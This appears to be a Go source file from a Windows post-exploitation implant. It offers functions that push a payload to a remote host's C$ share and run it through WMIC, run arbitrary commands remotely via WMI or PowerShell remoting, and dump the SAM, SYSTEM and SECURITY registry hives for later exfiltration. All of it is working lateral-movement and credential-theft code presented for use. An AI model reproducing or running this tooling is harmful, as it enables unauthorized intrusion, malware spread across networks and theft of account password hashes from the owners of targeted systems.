//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// smbExec copies a payload to a remote share and executes it via WMI.
// usage: smb-exec <host> <user> <pass> <local_payload_b64> [target_path]
func smbExec(host, user, pass, localPayloadPath, remotePath string) (string, string) {
	if remotePath == "" {
		remotePath = `C:\Windows\Temp\svc.exe`
	}

	// Mount share using net use
	share := fmt.Sprintf(`\\%s\C$`, host)
	mountCmd := fmt.Sprintf(`net use %s /user:%s %s`, share, user, pass)
	out, err := executeShell(mountCmd)
	if err != nil {
		return fmt.Sprintf("net use failed: %v\n%s", err, out), "failed"
	}

	// Copy payload via UNC path
	uncTarget := fmt.Sprintf(`\\%s\C$\Windows\Temp\svc.exe`, host)
	if _, err := executeShell(fmt.Sprintf(`copy "%s" "%s" /Y`, localPayloadPath, uncTarget)); err != nil {
		executeShell(fmt.Sprintf(`net use %s /delete /y`, share))
		return fmt.Sprintf("copy failed: %v", err), "failed"
	}

	// Execute via WMIC
	wmiCmd := fmt.Sprintf(
		`wmic /node:"%s" /user:"%s" /password:"%s" process call create "%s"`,
		host, user, pass, remotePath,
	)
	execOut, _ := executeShell(wmiCmd)

	// Clean up mount
	executeShell(fmt.Sprintf(`net use %s /delete /y`, share))

	return fmt.Sprintf("[+] SMB/WMI exec on %s:\n%s", host, execOut), "completed"
}

// wmiExec runs a command on a remote host using WMI (no file copy needed).
// usage: wmi-exec <host> <user> <pass> <command>
func wmiExec(host, user, pass, cmd string) (string, string) {
	wmiCmd := fmt.Sprintf(
		`wmic /node:"%s" /user:"%s" /password:"%s" process call create "%s"`,
		host, user, pass, cmd,
	)
	out, err := executeShell(wmiCmd)
	if err != nil {
		return fmt.Sprintf("WMI exec failed: %v\n%s", err, out), "failed"
	}
	return fmt.Sprintf("[+] WMI exec on %s:\n%s", host, out), "completed"
}

// psExec runs a command on a remote host using PowerShell Remoting (WinRM).
// usage: psexec <host> <user> <pass> <command>
func psExec(host, user, pass, cmd string) (string, string) {
	psCmd := fmt.Sprintf(
		`powershell -Command "$pw = ConvertTo-SecureString '%s' -AsPlainText -Force; $cred = New-Object PSCredential('%s', $pw); Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock { %s }"`,
		pass, user, host, cmd,
	)
	out, err := executeShell(psCmd)
	if err != nil {
		return fmt.Sprintf("PSExec failed: %v\n%s", err, out), "failed"
	}
	return fmt.Sprintf("[+] PSExec on %s:\n%s", host, out), "completed"
}

// dumpSAM attempts to dump SAM database via reg save (requires SYSTEM).
func dumpSAM() (string, string) {
	tmpSam  := os.TempDir() + `\sam.bak`
	tmpSys  := os.TempDir() + `\sys.bak`
	tmpSec  := os.TempDir() + `\sec.bak`
	defer os.Remove(tmpSam)
	defer os.Remove(tmpSys)
	defer os.Remove(tmpSec)

	out1, _ := executeShell(fmt.Sprintf(`reg save HKLM\SAM "%s" /y`, tmpSam))
	out2, _ := executeShell(fmt.Sprintf(`reg save HKLM\SYSTEM "%s" /y`, tmpSys))
	out3, _ := executeShell(fmt.Sprintf(`reg save HKLM\SECURITY "%s" /y`, tmpSec))

	var findings []string
	for _, path := range []string{tmpSam, tmpSys, tmpSec} {
		if info, err := os.Stat(path); err == nil {
			base := filepath.Base(path)
			findings = append(findings, fmt.Sprintf("[+] Saved %s (%d bytes) — exfil with: download %s", base, info.Size(), path))
		}
	}
	if len(findings) == 0 {
		combined := strings.Join([]string{out1, out2, out3}, "\n")
		return fmt.Sprintf("SAM dump failed (need SYSTEM privileges):\n%s", combined), "failed"
	}
	return strings.Join(findings, "\n"), "completed"
}
